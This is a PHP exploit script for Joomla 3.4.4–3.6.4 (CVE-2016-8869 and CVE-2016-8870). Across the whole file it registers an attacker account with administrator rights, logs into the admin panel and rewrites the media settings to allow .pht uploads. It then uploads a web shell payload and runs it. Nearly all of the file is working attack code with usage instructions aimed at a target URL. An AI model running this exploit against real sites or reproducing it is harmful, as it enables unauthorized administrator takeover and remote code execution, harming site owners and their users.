<?php

/**
 * Exploit for Joomla 3.4.4 - 3.6.4 (CVE-2016-8869 and CVE-2016-8870) with File Upload web shell
 *
 * @author jack <rustyj4ck@gmail.com>
 *
 * Usage: php exploit.php --username hacker -p password -e hacker@example.com http://localhost:9994/
 *
 * This is PHP port, original python source code provided by
 * @link https://github.com/XiphosResearch/exploits/tree/master/Joomraa
 *
 * @licence WTFPL
 */

require "vendor/autoload.php";

JoomlaExploitCVE_2016_8869::main();

class JoomlaExploitCVE_2016_8869
{

    private $options;
    private $token;

    static function main()
    {
        (new self)->run();
    }

    function run()
    {
        self::d('Booting...');

        $this->getOptions();

        if (!$this->option('url')) {
            self::done('[?] Url is not set');
        }

        self::d('Victim is ' . $this->option('url'));

        if ($this->pwnJoomla()) {
            self::d("[$] Exploit Successful!");
        }
    }

    /**
     * Do stuff
     * @return bool
     */
    function pwnJoomla()
    {
        self::d('[-] Getting token');

        $response = $this->fetch("/index.php/component/users/?view=login");
        if (!$this->extractToken($response->getBody()))
            self::done('[!] Cannot find CSRF token');

        self::d('[-] Creating user account');

        $response = $this->createUser();

        if (200 != $response->getStatusCode()) {
            self::d('[!] Account not created or already exists');
        }

        // User registration must be enabled: your must activate user before this point
        // /component/users/?task=registration.activate&token=44e2d33782b765c4692a0c08aea8263f
        // --> Your Account has been successfully activated.
        $result = $this->tryLogin();
        self::d($result ? '[+] Admin Login Success!' : '[!] Admin Login Failure! Your must activate user before this point');

        return $this->stageTwo();
    }

    function getMediaOptions()
    {
        self::d("[+] Getting media options");
        $url = '/administrator/index.php?option=com_config&view=component&component=com_media&path=';
        $response = (string)$this->fetch($url)->getBody();
        if (!preg_match_all('@name="(?<name>[^"]+)"\s+[^>]*?value="(?<value>[^"]+)"@', $response, $matches, PREG_SET_ORDER))
            return false;

        $options = ['jform' => []];

        foreach ($matches as $v) {
            if (preg_match('/jform\[(?<name>[\w_]+)\]/', $v['name'], $vsub))
                $options['jform'][$vsub['name']] = $v['value'];
            else
                $options[$v['name']] = $v['value'];
        }

        return $options;
    }

    /**
     * Allow us to upload a .pht file
     * @param $options
     */
    function setMediaOptions($options)
    {
        // @fixme newdata.update
//        $options['id'] = 13;
//        $options['jform'] = array_replace([
//            'upload_extensions' => 'bmp,csv,doc,gif,ico,jpg,jpeg,odg,odp,ods,odt,pdf,png,ppt,swf,txt,xcf,xls,BMP,CSV,DOC,GIF,ICO,JPG,JPEG,ODG,ODP,ODS,ODT,PDF,PNG,PPT,SWF,TXT,XCF,XLS',
//            'upload_maxsize' => 10,
//            'file_path' => 'images',
//            'image_path' => 'images',
//            'restrict_uploads' => 1,
//            'check_mime' => 0,
//            'image_extensions' => 'bmp,gif,jpg,png',
//            'ignore_extensions' => '',
//            'upload_mime' => 'image/jpeg,image/gif,image/png,image/bmp,application/x-shockwave-flash,application/msword,application/excel,application/pdf,application/powerpoint,text/plain,application/x-zip',
//            'upload_mime_illegal' => ''
//        ], $options['jform']);

        $options['component'] = 'com_media';
	    $options['task'] = 'config.save.component.apply';

        $url ='/administrator/index.php?option=com_config';
        $response = (string)$this->fetch($url, self::HTTP_POST, ['form_params' => $options, 'allow_redirects' => true])->getBody();

        return (false !== strpos($response, 'jform[upload_extensions]'));
    }

    /**
     * Now we are logged in to admin area,
     * use this to gain shell execution using .pht upload.
     * Ooh, scary super 0-day lol ^_^ *rolleyes*
     */
    function stageTwo()
    {

        $mOptions = $this->getMediaOptions();
        
        if (!$mOptions) {
            self::done('[!] MediaOptions Failed');
        }

        $mOptions['jform'] = array_replace($mOptions['jform'], [
            'check_mime' => 0,
            'restrict_uploads' => 0,
            'upload_extensions' => self::_addString($mOptions, 'upload_extensions', 'pht'),
            'image_extensions' => self::_addString($mOptions, 'image_extensions', 'pht'),
            'upload_mime' => self::_addString($mOptions, 'upload_mime', 'application/octet-stream'),
            'upload_mime_illegal' => ''
        ]);

        if (!$this->setMediaOptions($mOptions)) {
            self::done('[!] Maybe failed to set media options...');
        }

	    $imagePath = $mOptions['jform']['image_path'] ?? 'images';

	    return $this->uploadFile($imagePath);
    }

    private static function _addString($options, $key, $value)
    {
        $keyValue = $options['jform'][$key];

        // @fixme false positive
        if (strpos($keyValue, $value) !== false) return $keyValue;

        return $keyValue . ',' . $value;
    }


    /**
     * Upload and run payload
     * @param $imagePath
     * @return bool
     */
    function uploadFile($imagePath)
    {
        self::d("[*] Upload shell");
        $url      = "/administrator/index.php?option=com_media&folder=";
        $response = (string) $this->fetch($url)->getBody();
        if (!preg_match('/form action="(?<action>[^"]+)" id="uploadForm"/', $response, $matches)) {
            self::d("[!] Cannot find file upload form!");
            return false;
        }
        $url = html_entity_decode(urldecode($matches['action']));
        $filename = base_convert(sprintf('%u',crc32(microtime(1))), 10, 36) . '.pht';
        $exploitUrl = sprintf("/%s/%s", $imagePath, $filename);
	    self::d("[-] Uploading exploit to", $exploitUrl);

        $uploadData = [
            'multipart' => [
                [
                    'name' => 'Filedata[]',
                    'contents' => file_get_contents($this->option('exploit')),
                    'filename' => $filename,
                    'headers'  => ['Content-Type' => 'application/octet-stream']
                ]
            ],
            'allow_redirects' => true
        ];

        $response = (string) $this->fetch($url, self::HTTP_POST, $uploadData)->getBody();

        if (false === strpos($response, $filename)) {
            self::d("[!] Failed to upload file!");
            return false;
        }

        self::d('[*] Calling exploit');

        $response = (string)$this->fetch($exploitUrl)->getBody();

        if (0 !== strpos($response, 'pwn4')) {
            self::d('[!] Exploit failed to launch! Search string not found');
            return false;
        }

        return true;
    }

    /**
     * Admin login
     * @return bool
     */
    function tryLogin()
    {
        self::d('[-] Getting token for admin login');
        $response = $this->fetch('/administrator/index.php');
        if (!$this->extractToken($response->getBody()))
            self::done('[!] Cannot find CSRF token');

        self::d('[-] Logging in to admin');

        $postData = [
            'username' => $this->option('username'),
            'passwd' => $this->option('password'),
		    'task' => 'login',
            $this->token => '1'
	    ];

        $response = $this->fetch("/administrator/index.php",
            self::HTTP_POST, ['form_params' => $postData, 'allow_redirects' => true]);

        return strpos($response->getBody(), 'task=profile.edit') !== false;

    }

    /**
     * Create joomla user
     * @return mixed|\Psr\Http\Message\ResponseInterface
     */
    function createUser()
    {
        $userData = [
            'name' => $this->option('username'),
            'username' => $this->option('username'),
            'password1' => $this->option('password'),
            'password2' => $this->option('password'),
            'email1' => $this->option('email'),
            'email2' => $this->option('email'),
        ];

       $postData = [
            'user' => array_merge($userData, [
                'groups' => [7], # Admin,
                'activation' => 0,
                'block' => 0
            ]),

            'form' => array_merge($userData, [
                'option' => 'com_users',
                'task' => 'user.register',
            ]),

            $this->token => '1'
        ];

        // expect 303 redirect on errors
        return $this->fetch("/index.php/component/users/?task=user.register",
            self::HTTP_POST, ['form_params' => $postData, 'allow_redirects' => false]);

    }

    function extractToken($body)
    {
       preg_match('@name="([a-f0-9]{32})" value="1"@', $body, $m);
       self::d('Token', $this->token = @$m[1]);
       return $this->token;
    }

    function getOptions()
    {
        $args = [
            'u:' => 'username:',
            'p:' => 'password:',
            'e:' => 'email:',
            's:' => 'search:',
            'x:' => 'exploit:'
        ];

        $options = getopt(join('', array_keys($args)), array_values($args));

        foreach ($options as $k => $option) {
            if (isset($args[$k.':'])) {
                $options[substr($args[$k.':'], 0, -1)] = $option;
                unset($options[$k]);
            }
        }

        $options['exploit'] = $options['exploit'] ?? 'payload.pht';
        $options['url'] = rtrim(end($_SERVER['argv']), '/');

        $this->options = $options;
    }

    //
    // Helpers
    //

    static function done($message)
    {
        echo $message;
        exit;
    }

    function option($opt)
    {
        return @$this->options[$opt];
    }

    private static $_time;

    private static function d(...$args)
    {
        if (!isset(self::$_time)) self::$_time = microtime(1);
        printf('[%.3f] %s %s', microtime(1) - self::$_time, join(' | ', $args), PHP_EOL);
    }

    const HTTP_GET = 'GET';
    const HTTP_POST = 'POST';

    private $_session;

    /**
     * @param $url
     * @param string $method
     * @param array $params
     * @return mixed|\Psr\Http\Message\ResponseInterface
     */
    private function fetch($url, $method = self::HTTP_GET, $params = [])
    {
        if (!isset($this->_session)) {
            $this->_session = new \GuzzleHttp\Cookie\SessionCookieJar('');
        }
        $client = new \GuzzleHttp\Client(['cookies' => $this->_session]);
        $fullUrl =  (0 === strpos($url, 'http')) ? $url : $this->option('url') . $url;
        $res = $client->request($method, $fullUrl, $params);
        self::d('..fetch', $method, $url, $res->getStatusCode() /*, json_encode($this->_session->toArray())*/);
        return $res;
    }

}